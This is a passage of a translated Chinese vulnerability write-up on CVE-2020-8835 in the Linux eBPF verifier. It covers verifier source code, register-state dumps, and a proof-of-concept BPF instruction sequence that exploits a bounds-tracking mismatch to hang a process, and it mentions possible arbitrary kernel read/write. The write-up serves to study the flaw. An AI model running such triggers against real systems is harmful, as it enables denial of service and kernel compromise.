@@ -1,0 +1,1546 @@
+# CVE-2020-8835：Linux eBPF模块verifier组件漏洞分析
+
+阅读量 **503286**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2020-04-20 15:30:53
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p2.ssl.qhimg.com/t0104539f2dfc566d12.png)
+
+## eBPF简介
+
+> bpf系统调用执行一系列与extended Berkeley Packet Filters相关的操作，eBPF与传统的BPF相似，作用为
+> 过滤网络包。对于eBPF和传统的BPF来说，为了确保它们进行的操作不会损伤运行时的系统，内核会在加载程序之前静态地分析它们。
+
+简而言之，eBPF可以加载数据过滤代码到内核，并在进行相关操作的时候触发代码
+
+通常见到的seccomp沙箱就是使用了eBPF模块
+
+## eBPF程序的载入
+
+###  bpf_insn
+
+`bpf_insn`是一个结构体，代表一条eBPF指令
+
+    
+    
+    struct bpf_insn {
+        __u8    code;        /* opcode */
+        __u8    dst_reg:4;    /* dest register */
+        __u8    src_reg:4;    /* source register */
+        __s16    off;        /* signed offset */
+        __s32    imm;        /* signed immediate constant */
+    };
+    
+
+每一个eBPF程序都是一个`bpf_insn`数组，使用bpf系统调用将其载入内核
+
+具体每个字段的含义可以随之后的分析进行了解
+
+###  bpf_prog_load
+
+要将eBPF程序载入内核中，需要使用bpf系统调用
+
+    
+    
+    #define LOG_BUF_SIZE 65536
+    #define __NR_BPF 321
+    char bpf_log_buf[LOG_BUF_SIZE];
+    int bpf_prog_load(enum bpf_prog_type type,
+                      const struct bpf_insn *insns, int insn_cnt,
+                      const char *license)
+    {
+        union bpf_attr attr = {
+            .prog_type = type,
+            .insns = ptr_to_u64(insns),
+            .insn_cnt = insn_cnt,
+            .license = ptr_to_u64(license),
+            .log_buf = ptr_to_u64(bpf_log_buf),
+            .log_size = LOG_BUF_SIZE,
+            .log_level = 1,
+        };
+    
+        return syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));
+    }
+    
+
+其中，`type`表示eBPF程序类型，不同类型的程序作用不同，例如当`type`为`BPF_PROG_TYPE_SOCKET_FILTER`时，表示该程序的作用是过滤进出口网络报文
+
+`insns`是`bpf_insn`数组，表示该程序的指令
+
+`insn_cnt`表示指令的条数
+
+`license`必须为`"GPL"`
+
+`bpf_log_bpf`中存储的是log信息，可以在程序载入内核之后打印它，能获取比较详细的验证时信息
+
+###  load_prog
+
+    
+    
+    int load_prog()
+    {
+        struct bpf_insn prog[] = {
+            ……
+            /*
+            指令……
+            */
+        };
+        return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog)/sizeof(struct bpf_insn), "GPL");
+    }
+    
+
+如此这般，如何在用户态将一个eBPF程序载入内核就清楚了
+
+## 漏洞分析
+
+2020年3月30日，漏洞作者分享了他触发漏洞的一段`eBPF`程序[1]
+
+    
+    
+    0: (b7) r0 = 808464432
+    1: (7f) r0 >>= r0
+    2: (14) w0 -= 808464432
+    3: (07) r0 += 808464432
+    4: (b7) r1 = 808464432
+    5: (de) if w1 s<= w0 goto pc+0
+    6: (07) r0 += -2144337872
+    7: (14) w0 -= -1607454672
+    8: (25) if r0 > 0x30303030 goto pc+0
+    9: (76) if w0 s>= 0x303030 goto pc+2
+    10: (05) goto pc-1
+    11: (05) goto pc-1
+    12: (95) exit
+    
+
+这段程序触发会使当前进程空转，陷入死循环
+
+乍一看，两个`goto pc-1`，当然会陷入死循环了，那这个Poc还有什么参考价值？
+
+## bpf_check
+
+以`Linux v5.6-rc5`的代码为例[2]，源码于[4]下载
+
+在使用`bpf`系统调用将`eBPF`程序载入内核时，内核会对载入的程序进行合法性检测，以此来保证程序的安全性
+
+在`bpf_check`中有两个主要的检查，一个是`check_cfg`，检查程序流程图，另一个是`do_check_main`，模拟执行程序来检查是否有非法操作
+
+    
+    
+    int bpf_check(struct bpf_prog **prog, union bpf_attr *attr,
+              union bpf_attr __user *uattr)
+    {
+        u64 start_time = ktime_get_ns();
+        struct bpf_verifier_env *env;
+        struct bpf_verifier_log *log;
+        int i, len, ret = -EINVAL;
+        bool is_priv;
+    
+        ……
+        ret = check_cfg(env);        <------------        if (ret < 0)
+            goto skip_full_check;
+    
+        ret = do_check_subprogs(env);
+        ret = ret ?: do_check_main(env);    <-------------    
+        ……
+    }
+    
+
+###  check_cfg
+
+    
+    
+    static int check_cfg(struct bpf_verifier_env *env)
+    {
+        struct bpf_insn *insns = env->prog->insnsi;
+        int insn_cnt = env->prog->len;
+        int *insn_stack, *insn_state;
+        int ret = 0;
+        int i, t;
+    
+        insn_state = env->cfg.insn_state = kvcalloc(insn_cnt, sizeof(int), GFP_KERNEL);
+        if (!insn_state)
+            return -ENOMEM;
+    
+        insn_stack = env->cfg.insn_stack = kvcalloc(insn_cnt, sizeof(int), GFP_KERNEL);
+        if (!insn_stack) {
+            kvfree(insn_state);
+            return -ENOMEM;
+        }
+    
+        insn_state[0] = DISCOVERED; /* mark 1st insn as discovered */
+        insn_stack[0] = 0; /* 0 is the first instruction */
+        env->cfg.cur_stack = 1;
+    
+    peek_stack:
+        if (env->cfg.cur_stack == 0)
+            goto check_state;
+        t = insn_stack[env->cfg.cur_stack - 1];
+    
+        if (BPF_CLASS(insns[t].code) == BPF_JMP ||
+            BPF_CLASS(insns[t].code) == BPF_JMP32) {
+            u8 opcode = BPF_OP(insns[t].code);
+    
+            if (opcode == BPF_EXIT) {
+                goto mark_explored;
+            } else if (opcode == BPF_CALL) {
+                ret = push_insn(t, t + 1, FALLTHROUGH, env, false);
+                if (ret == 1)
+                    goto peek_stack;
+                else if (ret < 0)
+                    goto err_free;
+                if (t + 1 < insn_cnt)
+                    init_explored_state(env, t + 1);
+                if (insns[t].src_reg == BPF_PSEUDO_CALL) {
+                    init_explored_state(env, t);
+                    ret = push_insn(t, t + insns[t].imm + 1, BRANCH,
+                            env, false);
+                    if (ret == 1)
+                        goto peek_stack;
+                    else if (ret < 0)
+                        goto err_free;
+                }
+            } else if (opcode == BPF_JA) {
+                if (BPF_SRC(insns[t].code) != BPF_K) {
+                    ret = -EINVAL;
+                    goto err_free;
+                }
+                /* unconditional jump with single edge */
+                ret = push_insn(t, t + insns[t].off + 1,    <----------------- 1
+                        FALLTHROUGH, env, true);
+                if (ret == 1)
+                    goto peek_stack;
+                else if (ret < 0)
+                    goto err_free;
+                /* unconditional jmp is not a good pruning point,
+                 * but it's marked, since backtracking needs
+                 * to record jmp history in is_state_visited().
+                 */
+                init_explored_state(env, t + insns[t].off + 1);
+                /* tell verifier to check for equivalent states
+                 * after every call and jump
+                 */
+                if (t + 1 < insn_cnt)
+                    init_explored_state(env, t + 1);
+            } else {
+                /* conditional jump with two edges */
+                init_explored_state(env, t);
+                ret = push_insn(t, t + 1, FALLTHROUGH, env, true);
+                if (ret == 1)
+                    goto peek_stack;
+                else if (ret < 0)
+                    goto err_free;
+    
+                ret = push_insn(t, t + insns[t].off + 1, BRANCH, env, true);
+                if (ret == 1)
+                    goto peek_stack;
+                else if (ret < 0)
+                    goto err_free;
+            }
+        } else {
+            /* all other non-branch instructions with single
+             * fall-through edge
+             */
+            ret = push_insn(t, t + 1, FALLTHROUGH, env, false);
+            if (ret == 1)
+                goto peek_stack;
+            else if (ret < 0)
+                goto err_free;
+        }
+    
+    mark_explored:                <------------------------ 2
+        insn_state[t] = EXPLORED;
+        if (env->cfg.cur_stack-- <= 0) {
+            verbose(env, "pop stack internal bugn");
+            ret = -EFAULT;
+            goto err_free;
+        }
+        goto peek_stack;
+    
+    check_state:                <------------------------ 3
+        for (i = 0; i < insn_cnt; i++) {
+            if (insn_state[i] != EXPLORED) {
+                verbose(env, "unreachable insn %dn", i);
+                ret = -EINVAL;
+                goto err_free;
+            }
+        }
+        ret = 0; /* cfg looks good */
+    
+    err_free:
+        kvfree(insn_state);
+        kvfree(insn_stack);
+        env->cfg.insn_state = env->cfg.insn_stack = NULL;
+        return ret;
+    }
+    
+
+代码中，`insn_state[i]`代表第`i`条指令的状态，`EXPLORED`表示第`i`条指令已经被遍历过了
+
+故箭头标记2处，表示标记一条指令被经过，然后再去取下一条指令
+
+箭头3处，有一个`for`循环来检查所有指令是否已经被遍历过，如果有任何一条指令没有被遍历，则返回错误码，并在log中写入错误信息`unreachable
+insn`
+
+因此，一个合格的`eBPF`程序要满足的第一个条件是，没有不可到达的指令
+
+另外，也要注意箭头1处所指的函数`pusn_insn`
+
+在程序中有`opcode`为`BPF_JA`，即 “无条件跳转” 的时候，会调用`push_insn(t, t + insns[t].off + 1,
+FALLTHROUGH, env, true);`来把下一条指令push入栈
+
+这里，`t`是当前指令的索引，`t+insns[t].off+1`是下一条指令的索引
+
+    
+    
+    /* t, w, e - match pseudo-code above:
+     * t - index of current instruction
+     * w - next instruction
+     * e - edge
+     */
+    static int push_insn(int t, int w, int e, struct bpf_verifier_env *env,
+                 bool loop_ok)
+    {
+        int *insn_stack = env->cfg.insn_stack;
+        int *insn_state = env->cfg.insn_state;
+    
+        if (e == FALLTHROUGH && insn_state[t] >= (DISCOVERED | FALLTHROUGH))
+            return 0;
+    
+        if (e == BRANCH && insn_state[t] >= (DISCOVERED | BRANCH))
+            return 0;
+    
+        if (w < 0 || w >= env->prog->len) {
+            verbose_linfo(env, t, "%d: ", t);
+            verbose(env, "jump out of range from insn %d to %dn", t, w);
+            return -EINVAL;
+        }
+    
+        if (e == BRANCH)
+            /* mark branch target for state pruning */
+            init_explored_state(env, w);
+    
+        if (insn_state[w] == 0) {
+            /* tree-edge */
+            insn_state[t] = DISCOVERED | e;
+            insn_state[w] = DISCOVERED;
+            if (env->cfg.cur_stack >= env->prog->len)
+                return -E2BIG;
+            insn_stack[env->cfg.cur_stack++] = w;
+            return 1;
+        } else if ((insn_state[w] & 0xF0) == DISCOVERED) {
+            if (loop_ok && env->allow_ptr_leaks)        <----------------- 1
+                return 0;
+            verbose_linfo(env, t, "%d: ", t);
+            verbose_linfo(env, w, "%d: ", w);
+            verbose(env, "back-edge from insn %d to %dn", t, w);
+            return -EINVAL;
+        } else if (insn_state[w] == EXPLORED) {
+            /* forward- or cross-edge */
+            insn_state[t] = DISCOVERED | e;
+        } else {
+            verbose(env, "insn state internal bugn");
+            return -EFAULT;
+        }
+        return 0;
+    }
+    
+
+箭头1处，如果`insn_state[w]`即下一条指令的状态为`DISCOVERED`，即当前的无条件跳转指令是往回跳的，就会进入箭头1这一分支。这时，`loop_ok`为1，如果`env->allow_ptr_leaks`为0的话，会报错`back-edge`，如果非0，则会继续运行
+
+那么，`env->allow_ptr_leaks`是由什么影响的呢？
+
+在`bpf_check`函数中有这么两句
+
+    
+    
+    ……
+    is_priv = capable(CAP_SYS_ADMIN);
+    ……
+    env->allow_ptr_leaks = is_priv;
+    ……
+    
+
+意味如果当前用户有`CAP_SYS_ADMIN`这个权限，那么`env->allow_ptr_leaks`就是1，否则就是0
+。那么一般我们的用户不是root，没有这个权限，因此`env->allow_ptr_leaks`一般为0
+
+这样的话，如果我们的`eBPF`程序中有往回跳转的指令，`push_insn`函数就会报错
+
+因此，一个权限一般的合格的`eBPF`程序要满足的第二个条件是，没有往回跳转的指令
+
+到这里，一般用户能正常通过`check_cfg`这一个函数所需要的条件就很明白了：
+
+  * 没有不可到达的指令
+  * 没有往回跳转的指令
+  * 没有跳的太远超出指令范围的指令
+
+而本文开始所展示的`eBPF`程序不符合第一个条件和第二个条件，那么它又是如何被载入内核的呢？
+
+###  do_check_main
+
+    
+    
+    static int do_check_main(struct bpf_verifier_env *env)
+    {
+        int ret;
+    
+        env->insn_idx = 0;
+        ret = do_check_common(env, 0);
+        if (!ret)
+            env->prog->aux->stack_depth = env->subprog_info[0].stack_depth;
+        return ret;
+    }
+    
+
+`do_check_main`函数中，调用了`do_check_commin`
+
+    
+    
+    static int do_check_common(struct bpf_verifier_env *env, int subprog)
+    {
+        ……
+        ret = do_check(env);
+        ……
+    }
+    
+
+且不管其他，我们主要注意的地方是这个`do_check`函数。在该函数中，内核会模拟执行被载入的程序，并逐条指令检查其合法性。何为不合法？`eBPF`程序的指令是包括内存存取相关指令的，因此对被存取的指针它会有类型以及范围的限定，而且限定非常严格。如果说限定的部分有漏洞，或者其他的原因导致限定失效，那么将会带来非常恐怖的后果。例如
+**任意地址读写**
+
+在遇到具有分支，例如`if xxx goto
+pc+x`这样的语句，内核会检测`if`判断的条件是否恒成立。若判断为恒成立或者恒不成立，则只分析相应的那一分支，而另一分支则不进行分析。没有被分析到的指令被视为`dead
+code`
+
+## Poc分析
+
+Poc的c文件链接在文末[3]，注意要用普通用户执行Poc
+
+    
+    
+    0: (b7) r0 = 808464432
+    1: (7f) r0 >>= r0
+    2: (14) w0 -= 808464432
+    3: (07) r0 += 808464432
+    4: (b7) r1 = 808464432
+    5: (de) if w1 s<= w0 goto pc+0
+    6: (07) r0 += -2144337872
+    7: (14) w0 -= -1607454672
+    8: (25) if r0 > 0x30303030 goto pc+0
+    9: (76) if w0 s>= 0x303030 goto pc+2
+    10: (05) goto pc-1
+    11: (05) goto pc-1
+    12: (95) exit
+    
+
+首先先回答一个问题，为什么`goto pc-1`这样不能通过`check_cfg`的指令会被载入到内核中呢？
+
+答案在`bpf_check`函数中
+
+就在调用`do_check_main`那条语句的下方，还有几条代码
+
+    
+    
+    if (is_priv) {
+            if (ret == 0)
+                opt_hard_wire_dead_code_branches(env);
+            if (ret == 0)
+                ret = opt_remove_dead_code(env);
+            if (ret == 0)
+                ret = opt_remove_nops(env);
+        } else {
+            if (ret == 0)
+                sanitize_dead_code(env);
+        }
+    
+
+代码中，`is_priv`为何物我们已经了解，如果用户为root的话，`is_priv`为1，用户为具有一般权限的一般用户的话，其为0
+
+关于`is_priv`为1的情况下内核究竟对`eBPF`程序做了什么不去细说，总结为一句话就是：内核将`dead
+code`全部替换为`exit`，即退出指令
+
+那么接下来来看`sanitize_dead_code`函数
+
+    
+    
+    /* The verifier does more data flow analysis than llvm and will not
+     * explore branches that are dead at run time. Malicious programs can
+     * have dead code too. Therefore replace all dead at-run-time code
+     * with 'ja -1'.
+     *
+     * Just nops are not optimal, e.g. if they would sit at the end of the
+     * program and through another bug we would manage to jump there, then
+     * we'd execute beyond program memory otherwise. Returning exception
+     * code also wouldn't work since we can have subprogs where the dead
+     * code could be located.
+     */
+    static void sanitize_dead_code(struct bpf_verifier_env *env)
+    {
+        struct bpf_insn_aux_data *aux_data = env->insn_aux_data;
+        struct bpf_insn trap = BPF_JMP_IMM(BPF_JA, 0, 0, -1);
+        struct bpf_insn *insn = env->prog->insnsi;
+        const int insn_cnt = env->prog->len;
+        int i;
+    
+        for (i = 0; i < insn_cnt; i++) {
+            if (aux_data[i].seen)
+                continue;
+            memcpy(insn + i, &trap, sizeof(trap));
+        }
+    }
+    
+
+注释写的很清楚，这个函数会将所有的`dead code`改为`goto pc-1`，这样就能解释清楚`Poc`中10，11这两句不合法语句的来历了
+
+内核在检查程序合法性的过程中，第9句在检查时被判断为恒成立，之后的检查便只检查了第12句，第10和第11句被视为`dead
+code`，在之后的`sanitize_dead_code`函数中被修改为`goto
+pc-1`。而没有想到的是，在实际执行的时候第9句实际上是恒不成立，因此就导致程序执行了`goto
+pc-1`。在实际执行跳转指令的时候，跳转的偏移会默认加1，因此实际上`goto
+pc-1`跳转到的地方不是自己的上一条，而是自己，这就导致程序空转，陷入死循环
+
+那么为什么在检查的时候第九句的状态和实际执行时的状态不同呢？我们来一步步动态地分析一下
+
+在分析之前，要先了解寄存器结构体
+
+    
+    
+    struct bpf_reg_state {
+        enum bpf_reg_type type;
+        union {
+            /* valid when type == PTR_TO_PACKET */
+            u16 range;
+    
+            /* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |
+             *   PTR_TO_MAP_VALUE_OR_NULL
+             */
+            struct bpf_map *map_ptr;
+    
+            u32 btf_id; /* for PTR_TO_BTF_ID */
+    
+            /* Max size from any of the above. */
+            unsigned long raw;
+        };
+        s32 off;
+        u32 id;
+        u32 ref_obj_id;
+        /* For scalar types (SCALAR_VALUE), this represents our knowledge of
+         * the actual value.
+         * For pointer types, this represents the variable part of the offset
+         * from the pointed-to object, and is shared with all bpf_reg_states
+         * with the same id as us.
+         */
+        struct tnum var_off;
+        /* Used to determine if any memory access using this register will
+         * result in a bad access.
+         * These refer to the same value as var_off, not necessarily the actual
+         * contents of the register.
+         */
+        s64 smin_value; /* minimum possible (s64)value */
+        s64 smax_value; /* maximum possible (s64)value */
+        u64 umin_value; /* minimum possible (u64)value */
+        u64 umax_value; /* maximum possible (u64)value */
+        struct bpf_reg_state *parent;
+        u32 frameno;
+        s32 subreg_def;
+        enum bpf_reg_liveness live;
+        /* if (!precise && SCALAR_VALUE) min/max/tnum don't affect safety */
+        bool precise;
+    };
+    
+
+理解该漏洞之前要先理解该结构体，要注意的一个字段是`var_off`，它是一个`tnum`结构体
+
+    
+    
+    /* tnum: tracked (or tristate) numbers
+     *
+     * A tnum tracks knowledge about the bits of a value.  Each bit can be either
+     * known (0 or 1), or unknown (x).  Arithmetic operations on tnums will
+     * propagate the unknown bits such that the tnum result represents all the
+     * possible results for possible values of the operands.
+     */
+    struct tnum {
+        u64 value;
+        u64 mask;
+    };
+    
+
+`tnum`的注释没太懂，我的理解是：
+
+  * `mask`为0的时候，表示该`tnum`是一个数字，值为`value`
+  * `mask`非0的时候，表示一个范围，所有与`mask`进行与操作不为0的数字都在这个范围内，而此时的`value`只是该范围内的一个数字，并不精确
+
+###  0: (b7) r0 = 808464432
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x30303030,
+        mask = 0x0
+      },
+      smin_value = 0x30303030,
+      smax_value = 0x30303030,
+      umin_value = 0x30303030,
+      umax_value = 0x30303030,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x0,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+此时，r0存储着一个确定的值，为0x30303030
+
+###  1: (7f) r0 >>= r0
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x0,
+        mask = 0xffffffffffffffff
+      },
+      smin_value = 0x8000000000000000,
+      smax_value = 0x7fffffffffffffff,
+      umin_value = 0x0,
+      umax_value = 0xffffffffffffffff,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x0,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+可以看到`var_off`改变了，变为了一个完全不确定的值，且`smin_value, smax_value, umin_value,
+umax_value`都变为了相应范围的最大最小值
+
+相应代码如下：
+
+    
+    
+    case BPF_RSH:
+            if (umax_val >= insn_bitness) {
+                /* Shifts greater than 31 or 63 are undefined.
+                 * This includes shifts by a negative number.
+                 */
+                mark_reg_unknown(env, regs, insn->dst_reg);
+                break;
+            }
+            scalar_min_max_rsh(dst_reg, &src_reg);
+            break;
+    
+
+这里的`umax_val`就是`r0->umax_val`，在执行到这里的时候，为`0x30303030`，大于`insn_bitness`即64，所以就会标记寄存器为`unknown`
+
+    
+    
+    static void mark_reg_unknown(struct bpf_verifier_env *env,
+                     struct bpf_reg_state *regs, u32 regno)
+    {
+        if (WARN_ON(regno >= MAX_BPF_REG)) {
+            verbose(env, "mark_reg_unknown(regs, %u)n", regno);
+            /* Something bad happened, let's kill all regs except FP */
+            for (regno = 0; regno < BPF_REG_FP; regno++)
+                __mark_reg_not_init(env, regs + regno);
+            return;
+        }
+        __mark_reg_unknown(env, regs + regno);
+    }
+    
+    static void __mark_reg_unknown(const struct bpf_verifier_env *env,
+                       struct bpf_reg_state *reg)
+    {
+        /*
+         * Clear type, id, off, and union(map_ptr, range) and
+         * padding between 'type' and union
+         */
+        memset(reg, 0, offsetof(struct bpf_reg_state, var_off));
+        reg->type = SCALAR_VALUE;
+        reg->var_off = tnum_unknown;
+        reg->frameno = 0;
+        reg->precise = env->subprog_cnt > 1 || !env->allow_ptr_leaks ?
+                   true : false;
+        __mark_reg_unbounded(reg);
+    }
+    
+    static void __mark_reg_unbounded(struct bpf_reg_state *reg)
+    {
+        reg->smin_value = S64_MIN;
+        reg->smax_value = S64_MAX;
+        reg->umin_value = 0;
+        reg->umax_value = U64_MAX;
+    }
+    
+
+可以看到，`mark_reg_unknown`总共做了这些事：
+
+  * reg->type = SCALAR_VALUE
+  * reg->var_off = {0, 0xffffffffffffffff}
+  * reg->smin_value = 0x8000000000000000
+  * reg->smax_value = 0x7fffffffffffffff
+  * reg->umin_value = 0
+  * reg->umax_value = 0xffffffffffffffff
+
+###  2: (14) w0 -= 808464432
+
+主要代码位于`adjust_scalar_min_max_vals`函数中
+
+    
+    
+    static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
+                          struct bpf_insn *insn,
+                          struct bpf_reg_state *dst_reg,
+                          struct bpf_reg_state src_reg)
+    {
+        struct bpf_reg_state *regs = cur_regs(env);
+        u8 opcode = BPF_OP(insn->code);
+        bool src_known, dst_known;
+        s64 smin_val, smax_val;
+        u64 umin_val, umax_val;
+        u64 insn_bitness = (BPF_CLASS(insn->code) == BPF_ALU64) ? 64 : 32;
+        u32 dst = insn->dst_reg;
+        int ret;
+    
+        if (insn_bitness == 32) {
+            /* Relevant for 32-bit RSH: Information can propagate towards
+             * LSB, so it isn't sufficient to only truncate the output to
+             * 32 bits.
+             */
+            coerce_reg_to_size(dst_reg, 4);
+            coerce_reg_to_size(&src_reg, 4);
+        }
+    
+        smin_val = src_reg.smin_value;
+        smax_val = src_reg.smax_value;
+        umin_val = src_reg.umin_value;
+        umax_val = src_reg.umax_value;
+        src_known = tnum_is_const(src_reg.var_off);
+        dst_known = tnum_is_const(dst_reg->var_off);
+    
+        ……
+    
+        switch (opcode) {
+        ……
+        case BPF_SUB:
+            ret = sanitize_val_alu(env, insn);
+            if (ret < 0) {
+                verbose(env, "R%d tried to sub from different pointers or scalarsn", dst);
+                return ret;
+            }
+            scalar_min_max_sub(dst_reg, &src_reg);
+            break;
+        ……
+        }
+    
+        if (BPF_CLASS(insn->code) != BPF_ALU64) {
+            /* 32-bit ALU ops are (32,32)->32 */
+            coerce_reg_to_size(dst_reg, 4);
+        }
+    
+        __update_reg_bounds(dst_reg);
+        __reg_deduce_bounds(dst_reg);
+        __reg_bound_offset(dst_reg);
+        return 0;
+    }
+    
+
+由于该条指令使用的是32位寄存器，因此会先调用`coerce_reg_to_size`将寄存器转化为32位的
+
+    
+    
+    static void coerce_reg_to_size(struct bpf_reg_state *reg, int size)
+    {
+        u64 mask;
+    
+        /* clear high bits in bit representation */
+        reg->var_off = tnum_cast(reg->var_off, size);
+    
+        /* fix arithmetic bounds */
+        mask = ((u64)1 << (size * 8)) - 1;
+        if ((reg->umin_value & ~mask) == (reg->umax_value & ~mask)) {
+            reg->umin_value &= mask;
+            reg->umax_value &= mask;
+        } else {
+            reg->umin_value = 0;
+            reg->umax_value = mask;
+        }
+        reg->smin_value = reg->umin_value;
+        reg->smax_value = reg->umax_value;
+    }
+    
+
+转换完之后，寄存器的状态：
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x0,
+        mask = 0xffffffff
+      },
+      smin_value = 0x0,
+      smax_value = 0xffffffff,
+      umin_value = 0x0,
+      umax_value = 0xffffffff,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x3,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+之后开始做减法，此时的`src_reg`其实就是`808464432`，只不过是用一个暂时的寄存器将其保存了
+
+相关代码如下：
+
+    
+    
+    static void scalar_min_max_sub(struct bpf_reg_state *dst_reg,
+                       struct bpf_reg_state *src_reg)
+    {
+        s64 smin_val = src_reg->smin_value;
+        s64 smax_val = src_reg->smax_value;
+        u64 umin_val = src_reg->umin_value;
+        u64 umax_val = src_reg->umax_value;
+    
+        if (signed_sub_overflows(dst_reg->smin_value, smax_val) ||
+            signed_sub_overflows(dst_reg->smax_value, smin_val)) {
+            /* Overflow possible, we know nothing */
+            dst_reg->smin_value = S64_MIN;
+            dst_reg->smax_value = S64_MAX;
+        } else {
+            dst_reg->smin_value -= smax_val;    <-------------            dst_reg->smax_value -= smin_val;
+        }
+        if (dst_reg->umin_value < umax_val) {
+            /* Overflow possible, we know nothing */
+            dst_reg->umin_value = 0;            <-------------            dst_reg->umax_value = U64_MAX;
+        } else {
+            /* Cannot overflow (as long as bounds are consistent) */
+            dst_reg->umin_value -= umax_val;
+            dst_reg->umax_value -= umin_val;
+        }
+        dst_reg->var_off = tnum_sub(dst_reg->var_off, src_reg->var_off);
+    }
+    
+
+`smin_value, smax_value, umin_value,
+umax_value`都是`0x30303030`，经过两个箭头所指的代码，就将寄存器的状态变成了
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x0,
+        mask = 0xffffffff
+      },
+      smin_value = 0xffffffffcfcfcfd0,
+      smax_value = 0xcfcfcfcf,
+      umin_value = 0x0,
+      umax_value = 0xffffffff,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x3,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+执行完减法之后，因为`BPF_CLASS`不是`BPF_ALU64`，所以其又进行了一次`coerce_reg_to_size`，之后的寄存器状态如下：
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x0,
+        mask = 0xffffffff
+      },
+      smin_value = 0x0,
+      smax_value = 0xffffffff,
+      umin_value = 0x0,
+      umax_value = 0xffffffff,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x3,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+最后执行完`__update_reg_bounds`、`__reg_deduce_bounds`、`__reg_bound_offset`之后寄存器的状态都没有改变
+
+第四句和第三句一样，是一个算术运算，其流程类似，故不分析
+
+执行完第四句之后，寄存器的状态：
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x0,
+        mask = 0x1ffffffff
+      },
+      smin_value = 0x30303030,
+      smax_value = 0x13030302f,
+      umin_value = 0x30303030,
+      umax_value = 0x13030302f,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x0,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+###  5: (de) if w1 s<= w0 goto pc+0
+
+执行这条语句之前，`r0`和`r1`的状态分别为：
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x0,
+        mask = 0x1ffffffff
+      },
+      smin_value = 0x30303030,
+      smax_value = 0x13030302f,
+      umin_value = 0x30303030,
+      umax_value = 0x13030302f,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x0,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+    $r1 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x30303030,
+        mask = 0x0
+      },
+      smin_value = 0x30303030,
+      smax_value = 0x30303030,
+      umin_value = 0x30303030,
+      umax_value = 0x30303030,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
+      subreg_def = 0x0,
+      live = REG_LIVE_WRITTEN,
+      precise = 0x1
+    }
+    
+
+执行这条语句之后，`r0`的状态变为：
+
+    
+    
+    $r0 = {
+      type = SCALAR_VALUE,
+      {
+        range = 0x0,
+        map_ptr = 0x0 <fixed_percpu_data>,
+        btf_id = 0x0,
+        raw = 0x0
+      },
+      off = 0x0,
+      id = 0x0,
+      ref_obj_id = 0x0,
+      var_off = {
+        value = 0x30303020,
+        mask = 0x10000001f
+      },
+      smin_value = 0x30303030,
+      smax_value = 0x13030302f,
+      umin_value = 0x30303030,
+      umax_value = 0x13030302f,
+      parent = 0x0 <fixed_percpu_data>,
+      frameno = 0x0,
